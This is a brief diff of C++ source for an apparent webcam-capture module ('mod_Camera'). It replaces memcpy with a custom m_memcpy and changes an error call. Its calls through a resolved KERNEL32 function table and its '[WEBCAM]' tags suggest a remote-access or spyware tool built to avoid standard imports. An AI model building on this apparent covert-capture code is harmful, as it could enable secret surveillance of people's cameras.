@@ -74,8 +74,8 @@ std::vector<BYTE> mod_Camera::bmpHeader(LONG lWidth, LONG lHeight, WORD wBitsPer
     unsigned int uiHeadsize = sizeof(bfh) + sizeof(bmpInfoHeader);
     
     std::vector<BYTE> nBuffer(uiHeadsize);
-    memcpy(nBuffer.data(), &bfh, sizeof(bfh));
-    memcpy(nBuffer.data() + sizeof(bfh), &bmpInfoHeader, sizeof(bmpInfoHeader));
+    m_memcpy(nBuffer.data(), &bfh, sizeof(bfh));
+    m_memcpy(nBuffer.data() + sizeof(bfh), &bmpInfoHeader, sizeof(bmpInfoHeader));
 
     return nBuffer;
 }
@@ -110,7 +110,7 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
     HGLOBAL hGlobalMem = this->KERNEL32.pGlobalAlloc(GHND | GMEM_DDESHARE, 0);
     
     if (!hGlobalMem) {
-        error_2("[WEBCAM][X] toJPEG");
+        error_2("[WEBCAM][X] toJPEG", -1);
         goto release;
     }
 
